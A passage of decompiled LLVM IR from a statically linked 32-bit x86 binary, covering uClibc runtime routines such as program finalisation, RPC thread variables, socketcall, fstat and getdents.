  %v0_8061a10 = phi i32 [ 255, %dec_label_pc_8061a01 ], [ 2048, %dec_label_pc_80619fa ], [ 99, %dec_label_pc_80619f3 ], [ 20, %dec_label_pc_80619ec ], [ -128, %dec_label_pc_80619e5 ], [ 1024, %dec_label_pc_80619d9 ], [ 4, %dec_label_pc_80619d2 ], [ 32, %dec_label_pc_80619cb ], [ 256, %dec_label_pc_80619c4 ], [ 2147483647, %dec_label_pc_80619bd ], [ 16, %dec_label_pc_80619af ], [ 127, %dec_label_pc_80619a8 ], [ 200112, %dec_label_pc_80619b6 ], [ 9, %dec_label_pc_806198d ], [ 65535, %dec_label_pc_8061983 ], [ -32768, %dec_label_pc_8061979 ], [ -2147483648, %dec_label_pc_806196f ], [ 8, %dec_label_pc_8061965 ], [ 500, %dec_label_pc_806195b ], [ 4096, %dec_label_pc_8061951 ], [ 16384, %dec_label_pc_8061947 ], [ 1000, %dec_label_pc_806193d ], [ 32768, %dec_label_pc_8061933 ], [ 6, %dec_label_pc_8061921 ], [ 65536, %dec_label_pc_806190f ], [ 100, %dec_label_pc_8061905 ], [ 131072, %dec_label_pc_80618fb ], [ -1, %dec_label_pc_80619e0 ], [ 1, %dec_label_pc_80618e1 ], [ 32767, %dec_label_pc_8061a08 ]
  ret i32 %v0_8061a10

; uselistorder directives
  uselistorder i32 131072, { 1, 0 }
  uselistorder i32 -2147483648, { 6, 8, 9, 4, 7, 10, 0, 1, 2, 3, 5 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 76, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 66, { 0, 1, 3, 2 }
  uselistorder i32 65, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32 63, { 1, 2, 0, 3 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder label %dec_label_pc_8061a0d, { 29, 0, 1, 2, 3, 4, 27, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder label %dec_label_pc_80619e0, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80619b6, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8061933, { 1, 0 }
  uselistorder label %dec_label_pc_8061921, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061a4c = load i32, i32* @ebx, align 4
  store i32 %v0_8061a4c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070000.787 to i32), i32 -134676480), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070000.787 to i32), i32 -134676480), i32 2), i32 0), label %dec_label_pc_8061a60, label %dec_label_pc_8061a6d

dec_label_pc_8061a60:                             ; preds = %entry, %dec_label_pc_8061a60
  %v1_8061a678 = phi i32 [ %v1_8061a67, %dec_label_pc_8061a60 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070000.787 to i32), i32 -134676480), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8061a67.788 to i32), i32* %stack_var_-16, align 4
  %v5_8061a60 = mul i32 %v1_8061a678, 4
  %v6_8061a60 = add i32 %v5_8061a60, ptrtoint (i32* @global_var_8070000.787 to i32)
  %v7_8061a60 = inttoptr i32 %v6_8061a60 to i32*
  %v8_8061a60 = load i32, i32* %v7_8061a60, align 4
  call void @__pseudo_call(i32 %v8_8061a60)
  %v0_8061a67.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061a67 = add i32 %v0_8061a67.pre, -1
  store i32 %v1_8061a67, i32* %ebx.global-to-local, align 4
  %v10_8061a68 = icmp eq i32 %v0_8061a67.pre, 0
  %v1_8061a6b = icmp eq i1 %v10_8061a68, false
  br i1 %v1_8061a6b, label %dec_label_pc_8061a60, label %dec_label_pc_8061a6d

dec_label_pc_8061a6d:                             ; preds = %dec_label_pc_8061a60, %entry
  %v0_8061a6d = load i32, i32* @global_var_807d8d4.789, align 4
  %v1_8061a72 = icmp eq i32 %v0_8061a6d, 0
  br i1 %v1_8061a72, label %dec_label_pc_8061a78, label %dec_label_pc_8061a76

dec_label_pc_8061a76:                             ; preds = %dec_label_pc_8061a6d
  %v0_8061a76 = load i32, i32* %stack_var_-16, align 4
  %v1_8061a76 = call i32 @unknown_0(i32 %v0_8061a76)
  br label %dec_label_pc_8061a78

dec_label_pc_8061a78:                             ; preds = %dec_label_pc_8061a76, %dec_label_pc_8061a6d
  %v0_8061a78 = load i32, i32* @global_var_807d8d8.790, align 8
  %v1_8061a7e = icmp eq i32 %v0_8061a78, 0
  br i1 %v1_8061a7e, label %dec_label_pc_8061a87, label %dec_label_pc_8061a82

dec_label_pc_8061a82:                             ; preds = %dec_label_pc_8061a78
  %v2_8061a82 = load i32, i32* %stack_var_-16, align 4
  %v1_8061a85 = call i32 @unknown_0(i32 %v2_8061a82)
  br label %dec_label_pc_8061a87

dec_label_pc_8061a87:                             ; preds = %dec_label_pc_8061a82, %dec_label_pc_8061a78
  %v2_8061a87 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8061a87

; uselistorder directives
  uselistorder i32 %v1_8061a67, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8070000.787 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8061a60, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_8061ce9:
  %v4_8061cd5 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_807d900.796 to i32), i32 134577983, i32 134577983)
  ret i32 %v4_8061cd5
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8061ced = load i32, i32* @ebx, align 4
  %v1_8061cff = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_8061d0e = icmp eq i32 %v1_8061cff, 0
  store i32 %v1_8061cff, i32* @ebx, align 4
  %v1_8061d12 = icmp eq i1 %v1_8061d0e, false
  br i1 %v1_8061d12, label %dec_label_pc_8061dc8, label %dec_label_pc_8061d18

dec_label_pc_8061d18:                             ; preds = %entry
  %v5_8061d2d = call i32 @pthread_once(i32* nonnull @global_var_807d8e0.798, i32 134618304, i32 134587548, i32 134587548)
  %v1_8061d5d = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_8061d6c = icmp eq i32 %v1_8061d5d, 0
  store i32 %v1_8061d5d, i32* @ebx, align 4
  %v1_8061d70 = icmp eq i1 %v1_8061d6c, false
  br i1 %v1_8061d70, label %dec_label_pc_8061dc8, label %dec_label_pc_8061d72

dec_label_pc_8061d72:                             ; preds = %dec_label_pc_8061d18
  %v3_8061d7b = call i32 @calloc(i64 1, i32 200)
  %v1_8061d83 = icmp eq i32 %v3_8061d7b, 0
  store i32 %v3_8061d7b, i32* %ebx.global-to-local, align 4
  br i1 %v1_8061d83, label %dec_label_pc_8061da9, label %dec_label_pc_8061d89

dec_label_pc_8061d89:                             ; preds = %dec_label_pc_8061d72
  %v4_8061d97 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v3_8061d7b, i32 134577983, i32 134577983)
  %v0_8061dc9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061dc8

dec_label_pc_8061da9:                             ; preds = %dec_label_pc_8061d72
  %v1_8061db7 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8061db7, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061dc8

dec_label_pc_8061dc8:                             ; preds = %dec_label_pc_8061d18, %entry, %dec_label_pc_8061d89, %dec_label_pc_8061da9
  %v0_8061dc9 = phi i32 [ %v1_8061d5d, %dec_label_pc_8061d18 ], [ %v1_8061cff, %entry ], [ %v0_8061dc9.pre, %dec_label_pc_8061d89 ], [ %v1_8061db7, %dec_label_pc_8061da9 ]
  store i32 %v0_8061ced, i32* @ebx, align 4
  ret i32 %v0_8061dc9

; uselistorder directives
  uselistorder label %dec_label_pc_8061dc8, { 3, 2, 0, 1 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_8061e11 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8061e1b = icmp eq i32 %v1_8061e11, 134732032
  br i1 %v6_8061e1b, label %dec_label_pc_8061e28, label %dec_label_pc_8061e22

dec_label_pc_8061e22:                             ; preds = %entry
  %v1_8061e22 = add i32 %v1_8061e11, 128
  br label %dec_label_pc_8061e28

dec_label_pc_8061e28:                             ; preds = %entry, %dec_label_pc_8061e22
  %storemerge = phi i32 [ %v1_8061e22, %dec_label_pc_8061e22 ], [ ptrtoint (i32* @global_var_807f530.801 to i32), %entry ]
  %v0_8061e28 = phi i32 [ %v1_8061e22, %dec_label_pc_8061e22 ], [ ptrtoint (i32* @global_var_807f530.801 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8061e28

; uselistorder directives
  uselistorder i32 %v1_8061e11, { 1, 0 }
  uselistorder label %dec_label_pc_8061e28, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_8061e5c = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8061e5c, i32* @ebx, align 4
  %v1_8061e6e = icmp eq i32 %v1_8061e5c, 0
  br i1 %v1_8061e6e, label %dec_label_pc_8061f04, label %dec_label_pc_8061e76

dec_label_pc_8061e76:                             ; preds = %entry
  %v6_8061e76 = icmp eq i32 %v1_8061e5c, 134732032
  br i1 %v6_8061e76, label %dec_label_pc_8061f04, label %dec_label_pc_8061e82

dec_label_pc_8061e82:                             ; preds = %dec_label_pc_8061e76
  %v0_8061e82 = call i32 @__rpc_thread_svc_cleanup()
  %v0_8061e87 = call i32 @__rpc_thread_clnt_cleanup()
  %v0_8061e8f = load i32, i32* @ebx, align 4
  %v1_8061e8f = add i32 %v0_8061e8f, 152
  %v2_8061e8f = inttoptr i32 %v1_8061e8f to i32*
  %v3_8061e8f = load i32, i32* %v2_8061e8f, align 4
  %v1_8061e95 = call i32 @free(i32 %v3_8061e8f)
  %v0_8061e9b = load i32, i32* @ebx, align 4
  %v1_8061e9b = add i32 %v0_8061e9b, 156
  %v2_8061e9b = inttoptr i32 %v1_8061e9b to i32*
  %v3_8061e9b = load i32, i32* %v2_8061e9b, align 4
  %v1_8061ea1 = call i32 @free(i32 %v3_8061e9b)
  %v0_8061ea7 = load i32, i32* @ebx, align 4
  %v1_8061ea7 = add i32 %v0_8061ea7, 160
  %v2_8061ea7 = inttoptr i32 %v1_8061ea7 to i32*
  %v3_8061ea7 = load i32, i32* %v2_8061ea7, align 4
  %v1_8061ead = call i32 @free(i32 %v3_8061ea7)
  %v0_8061eb3 = load i32, i32* @ebx, align 4
  %v1_8061eb3 = add i32 %v0_8061eb3, 188
  %v2_8061eb3 = inttoptr i32 %v1_8061eb3 to i32*
  %v3_8061eb3 = load i32, i32* %v2_8061eb3, align 4
  %v1_8061eb9 = call i32 @free(i32 %v3_8061eb3)
  %v0_8061ebf = load i32, i32* @ebx, align 4
  %v1_8061ebf = add i32 %v0_8061ebf, 172
  %v2_8061ebf = inttoptr i32 %v1_8061ebf to i32*
  %v3_8061ebf = load i32, i32* %v2_8061ebf, align 4
  %v1_8061ec5 = call i32 @free(i32 %v3_8061ebf)
  %v0_8061ecb = load i32, i32* @ebx, align 4
  %v1_8061ecb = add i32 %v0_8061ecb, 176
  %v2_8061ecb = inttoptr i32 %v1_8061ecb to i32*
  %v3_8061ecb = load i32, i32* %v2_8061ecb, align 4
  %v1_8061ed1 = call i32 @free(i32 %v3_8061ecb)
  %v0_8061ed6 = load i32, i32* @ebx, align 4
  %v1_8061ed9 = call i32 @free(i32 %v0_8061ed6)
  %v0_8061eea = load i32, i32* @ecx, align 4
  %v4_8061ef0 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_8061eea, i32 %v0_8061eea)
  br label %dec_label_pc_8061f04

dec_label_pc_8061f04:                             ; preds = %dec_label_pc_8061e76, %entry, %dec_label_pc_8061e82
  %v2_8061f04 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_8061f04

; uselistorder directives
  uselistorder i32 %v1_8061e5c, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8061f04, { 2, 0, 1 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061f54 = load i32, i32* @ebx, align 4
  store i32 %v0_8061f54, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8061f67 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8061f67, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061f67, -4095
  br i1 %tmp, label %dec_label_pc_8061f80, label %dec_label_pc_8061f74

dec_label_pc_8061f74:                             ; preds = %entry
  %v0_8061f74 = load i32, i32* %stack_var_-4, align 4
  %v1_8061f74 = call i32 @__errno_location(i32 %v0_8061f74)
  %v0_8061f79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061f79 = sub i32 0, %v0_8061f79
  %v2_8061f7b = inttoptr i32 %v1_8061f74 to i32*
  store i32 %v1_8061f79, i32* %v2_8061f7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061f80

dec_label_pc_8061f80:                             ; preds = %entry, %dec_label_pc_8061f74
  %v0_8061f81 = phi i32 [ %v1_8061f67, %entry ], [ -1, %dec_label_pc_8061f74 ]
  %v2_8061f80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061f80, i32* @edx, align 4
  %v2_8061f84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061f84, i32* @ebx, align 4
  ret i32 %v0_8061f81

; uselistorder directives
  uselistorder i32 %v1_8061f67, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061f80, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061f88 = load i32, i32* @ebx, align 4
  store i32 %v0_8061f88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8061f9b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8061f9b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8061f9b, -4095
  br i1 %tmp, label %dec_label_pc_8061fb4, label %dec_label_pc_8061fa8

dec_label_pc_8061fa8:                             ; preds = %entry
  %v0_8061fa8 = load i32, i32* %stack_var_-4, align 4
  %v1_8061fa8 = call i32 @__errno_location(i32 %v0_8061fa8)
  %v0_8061fad = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061fad = sub i32 0, %v0_8061fad
  %v2_8061faf = inttoptr i32 %v1_8061fa8 to i32*
  store i32 %v1_8061fad, i32* %v2_8061faf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061fb4

dec_label_pc_8061fb4:                             ; preds = %entry, %dec_label_pc_8061fa8
  %v0_8061fb5 = phi i32 [ %v4_8061f9b, %entry ], [ -1, %dec_label_pc_8061fa8 ]
  %v2_8061fb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061fb8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061fb5

; uselistorder directives
  uselistorder i32 %v4_8061f9b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061fb4, { 1, 0 }
}

define i32 @fstat(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8062028 = load i32, i32* @ebx, align 4
  store i32 %v0_8062028, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_806203b = call i32 @fstat(i32 %v0_8062028, i32 %tmp3, i32 %arg1, i32 %arg2)
  store i32 %v4_806203b, i32* @ebx, align 4
  %tmp = icmp ult i32 %v4_806203b, -4095
  br i1 %tmp, label %dec_label_pc_8062056, label %dec_label_pc_8062048

dec_label_pc_8062048:                             ; preds = %entry
  %v0_8062048 = load i32, i32* %stack_var_-4, align 4
  %v1_8062048 = call i32 @__errno_location(i32 %v0_8062048)
  %v0_806204d = load i32, i32* @ebx, align 4
  %v1_806204d = sub i32 0, %v0_806204d
  %v2_806204f = inttoptr i32 %v1_8062048 to i32*
  store i32 %v1_806204d, i32* %v2_806204f, align 4
  br label %dec_label_pc_8062069

dec_label_pc_8062056:                             ; preds = %entry
  %v1_8062056 = icmp eq i32 %v4_806203b, 0
  %v1_8062058 = icmp eq i1 %v1_8062056, false
  br i1 %v1_8062058, label %dec_label_pc_8062069, label %dec_label_pc_806205a

dec_label_pc_806205a:                             ; preds = %dec_label_pc_8062056
  %v4_8062061 = bitcast i32* %stack_var_-68 to i16*
  %v5_8062061 = call i32 @__xstat_conv(i16* %v4_8062061, i32 %arg2, i32 %v4_806203b, i32 %v4_806203b)
  %v0_806206c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062069

dec_label_pc_8062069:                             ; preds = %dec_label_pc_8062056, %dec_label_pc_8062048, %dec_label_pc_806205a
  %v0_806206c = phi i32 [ %v4_806203b, %dec_label_pc_8062056 ], [ -1, %dec_label_pc_8062048 ], [ %v0_806206c.pre, %dec_label_pc_806205a ]
  %v2_806206e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806206e, i32* @ebx, align 4
  ret i32 %v0_806206c

; uselistorder directives
  uselistorder i32 %v4_806203b, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @fstat, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062069, { 2, 0, 1 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8062070 = load i32, i32* @edi, align 4
  %v0_8062071 = load i32, i32* @esi, align 4
  %v0_8062072 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8062077 = load i32, i32* @edx, align 4
  %v7_8062081 = inttoptr i32 %arg2 to i32*
  %v8_8062081 = call i32 @__getdents64(i32 %arg1, i32* %v7_8062081, i32 %arg3, i32 %v0_8062077, i32 %v0_8062072, i32 %v0_8062071, i32 %v0_8062070)
  store i32 %v8_8062081, i32* %eax.global-to-local, align 4
  store i32 %v8_8062081, i32* @esi, align 4
  %tmp14 = icmp slt i32 %v8_8062081, 1
  br i1 %tmp14, label %dec_label_pc_80620d9, label %dec_label_pc_806208f

dec_label_pc_806208f:                             ; preds = %entry
  %v0_806208f = load i32, i32* @ebx, align 4
  %v2_806208f = add i32 %v0_806208f, %v8_8062081
  store i32 %v2_806208f, i32* @edi, align 4
  %v7_80620d517 = icmp ult i32 %v0_806208f, %v2_806208f
  br i1 %v7_80620d517, label %dec_label_pc_8062094, label %dec_label_pc_80620d9

dec_label_pc_8062094:                             ; preds = %dec_label_pc_806208f, %dec_label_pc_8062094
  %v0_806209420 = phi i32 [ %v2_80620d3, %dec_label_pc_8062094 ], [ %v0_806208f, %dec_label_pc_806208f ]
  %v1_8062094 = add i32 %v0_806209420, 8
  %v2_8062094 = inttoptr i32 %v1_8062094 to i32*
  %v3_8062094 = load i32, i32* %v2_8062094, align 4
  store i32 %v3_8062094, i32* %eax.global-to-local, align 4
  %v2_8062097 = add i32 %v0_806209420, 4
  %v3_8062097 = inttoptr i32 %v2_8062097 to i32*
  store i32 %v3_8062094, i32* %v3_8062097, align 4
  %v0_806209a = load i32, i32* @ebx, align 4
  %v1_806209a = add i32 %v0_806209a, 16
  %v2_806209a = inttoptr i32 %v1_806209a to i32*
  %v3_806209a = load i32, i32* %v2_806209a, align 4
  store i32 %v3_806209a, i32* %eax.global-to-local, align 4
  %v1_806209d = trunc i32 %v3_806209a to i16
  %v3_806209d = add i32 %v0_806209a, 8
  %v4_806209d = inttoptr i32 %v3_806209d to i16*
  store i16 %v1_806209d, i16* %v4_806209d, align 2
  %v0_80620a1 = load i32, i32* @ebx, align 4
  %v1_80620a1 = add i32 %v0_80620a1, 18
  %v2_80620a1 = inttoptr i32 %v1_80620a1 to i8*
  %v3_80620a1 = load i8, i8* %v2_80620a1, align 1
  %v4_80620a1 = zext i8 %v3_80620a1 to i32
  %v5_80620a1 = load i32, i32* %eax.global-to-local, align 4
  %v6_80620a1 = and i32 %v5_80620a1, -256
  %v7_80620a1 = or i32 %v6_80620a1, %v4_80620a1
  store i32 %v7_80620a1, i32* %eax.global-to-local, align 4
  %v3_80620a4 = add i32 %v0_80620a1, 10
  %v4_80620a4 = inttoptr i32 %v3_80620a4 to i8*
  store i8 %v3_80620a1, i8* %v4_80620a4, align 1
  %v0_80620a8 = load i32, i32* @ebx, align 4
  %v1_80620b0 = add i32 %v0_80620a8, 19
  %v1_80620b4 = add i32 %v0_80620a8, 11
  store i32 %v1_80620b4, i32* %eax.global-to-local, align 4
  %v3_80620b8 = inttoptr i32 %v1_80620b4 to i8*
  %v4_80620b8 = call i32 @memmove(i8* %v3_80620b8, i32 %v1_80620b0)
  store i32 %v4_80620b8, i32* %eax.global-to-local, align 4
  %v0_80620bd = load i32, i32* @ebx, align 4
  %v1_80620bd = add i32 %v0_80620bd, 8
  %v2_80620bd = inttoptr i32 %v1_80620bd to i16*
  %v3_80620bd = load i16, i16* %v2_80620bd, align 2
  %v4_80620bd = zext i16 %v3_80620bd to i32
  store i32 %v4_80620bd, i32* %eax.global-to-local, align 4
  %v3_80620c7 = inttoptr i32 %v0_80620bd to i8*
  %v4_80620c7 = call i32 @memmove(i8* %v3_80620c7, i32 %v0_80620bd)
  store i32 %v4_80620c7, i32* %eax.global-to-local, align 4
  %v0_80620cc = load i32, i32* @ebx, align 4
  %v1_80620cc = add i32 %v0_80620cc, 8
  %v2_80620cc = inttoptr i32 %v1_80620cc to i16*
  %v3_80620cc = load i16, i16* %v2_80620cc, align 2
  %v4_80620cc = zext i16 %v3_80620cc to i32
  store i32 %v4_80620cc, i32* %eax.global-to-local, align 4
  %v2_80620d3 = add i32 %v4_80620cc, %v0_80620cc
  store i32 %v2_80620d3, i32* @ebx, align 4
  %v1_80620d5.pre = load i32, i32* @edi, align 4
  %v7_80620d5 = icmp ult i32 %v2_80620d3, %v1_80620d5.pre
  br i1 %v7_80620d5, label %dec_label_pc_8062094, label %dec_label_pc_80620d5.dec_label_pc_80620d9.loopexit_crit_edge

dec_label_pc_80620d5.dec_label_pc_80620d9.loopexit_crit_edge: ; preds = %dec_label_pc_8062094
  %v0_80620da.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80620d9

dec_label_pc_80620d9:                             ; preds = %dec_label_pc_806208f, %dec_label_pc_80620d5.dec_label_pc_80620d9.loopexit_crit_edge, %entry
  %v0_80620da = phi i32 [ %v8_8062081, %entry ], [ %v0_80620da.pre.pre, %dec_label_pc_80620d5.dec_label_pc_80620d9.loopexit_crit_edge ], [ %v8_8062081, %dec_label_pc_806208f ]
  store i32 %v0_80620da, i32* %eax.global-to-local, align 4
  store i32 %v0_8062071, i32* @esi, align 4
  store i32 %v0_8062070, i32* @edi, align 4
  ret i32 %v0_80620da

; uselistorder directives
  uselistorder i32 %v0_80620da, { 1, 0 }
  uselistorder i32 %v2_80620d3, { 1, 2, 0 }
  uselistorder i32 %v0_80620bd, { 1, 0, 2 }
  uselistorder i32 %v0_80620a8, { 1, 0 }
  uselistorder i32 (i8*, i32)* @memmove, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80620d9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062094, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_80620e3 = load i32, i32* @edi, align 4
  %v0_80620e5 = load i32, i32* @ebx, align 4
  %v15_80620e6 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_80620f2 = add i32 %arg3, 30
  %v1_80620f5 = and i32 %v1_80620f2, -16
  %v2_80620f8 = sub i32 %v15_80620e6, %v1_80620f5
  %v1_80620fa = add i32 %v2_80620f8, 15
  %v1_80620fe = and i32 %v1_80620fa, -16
  %v1_8062104 = inttoptr i32 %v1_80620fe to %linux_dirent64*
  store i32 %v1_80620fe, i32* @ecx, align 4
  %v2_8062106 = add i32 %v2_80620f8, -4
  %v3_8062106 = inttoptr i32 %v2_8062106 to i32*
  store i32 %v0_80620e5, i32* %v3_8062106, align 4
  %v0_8062107 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_806210e = call i32 @getdents64(i32 %v0_8062107, %linux_dirent64* %v1_8062104, i32 %arg3)
  store i32 %v5_806210e, i32* %eax.global-to-local, align 4
  %v0_8062110 = load i32, i32* @esp, align 4
  %v3_8062110 = add i32 %v0_8062110, 4
  %tmp = icmp ult i32 %v5_806210e, -4095
  br i1 %tmp, label %dec_label_pc_806212a, label %dec_label_pc_806211b

dec_label_pc_806211b:                             ; preds = %entry
  %v1_806211b = call i32 @__errno_location(i32 %v5_806210e)
  store i32 %v1_806211b, i32* %eax.global-to-local, align 4
  %v4_8062120 = sub i32 0, %v5_806210e
  store i32 %v4_8062120, i32* %edx.global-to-local, align 4
  %v2_8062126 = inttoptr i32 %v1_806211b to i32*
  store i32 %v4_8062120, i32* %v2_8062126, align 4
  br label %dec_label_pc_8062186

dec_label_pc_806212a:                             ; preds = %entry
  br i1 false, label %dec_label_pc_8062186, label %dec_label_pc_8062130

dec_label_pc_8062130:                             ; preds = %dec_label_pc_806212a
  store i32 %tmp13, i32* @esi, align 4
  %v5_80621dc = add i32 %v5_806210e, %v1_80620fe
  %v5_8062153 = add i32 %tmp13, %arg3
  store i32 %v1_80620fe, i32* @ebx, align 4
  store i32 %v5_80621dc, i32* %eax.global-to-local, align 4
  %v7_80621df31 = icmp ult i32 %v1_80620fe, %v5_80621dc
  br i1 %v7_80621df31, label %dec_label_pc_8062149, label %dec_label_pc_80621e7

dec_label_pc_8062149:                             ; preds = %dec_label_pc_8062130, %dec_label_pc_806218b
  %stack_var_-32.038 = phi i32 [ %v3_806218e, %dec_label_pc_806218b ], [ -1, %dec_label_pc_8062130 ]
  %stack_var_-36.037 = phi i32 [ %v3_806218b, %dec_label_pc_806218b ], [ -1, %dec_label_pc_8062130 ]
  %v0_806219736 = phi i32 [ %v2_80621d7, %dec_label_pc_806218b ], [ %v1_80620fe, %dec_label_pc_8062130 ]
  %v1_806219c35 = phi i32 [ %v2_8062159, %dec_label_pc_806218b ], [ %tmp13, %dec_label_pc_8062130 ]
  %v0_806216334 = phi i32 [ %v1_80621d1, %dec_label_pc_806218b ], [ %v3_8062110, %dec_label_pc_8062130 ]
  %v1_8062149 = add i32 %v0_806219736, 16
  %v2_8062149 = inttoptr i32 %v1_8062149 to i16*
  %v3_8062149 = load i16, i16* %v2_8062149, align 2
  %v4_8062149 = zext i16 %v3_8062149 to i32
  %v1_806214d = add nuw nsw i32 %v4_8062149, 3
  store i32 %v5_8062153, i32* %eax.global-to-local, align 4
  %v1_8062156 = and i32 %v1_806214d, 131068
  store i32 %v1_8062156, i32* %ecx.global-to-local, align 4
  %v2_8062159 = add i32 %v1_8062156, %v1_806219c35
  %tmp43 = icmp ugt i32 %v2_8062159, %v5_8062153
  br i1 %tmp43, label %dec_label_pc_8062163, label %dec_label_pc_806218b

dec_label_pc_8062163:                             ; preds = %dec_label_pc_8062149
  %v1_8062163 = add i32 %v0_806216334, -4
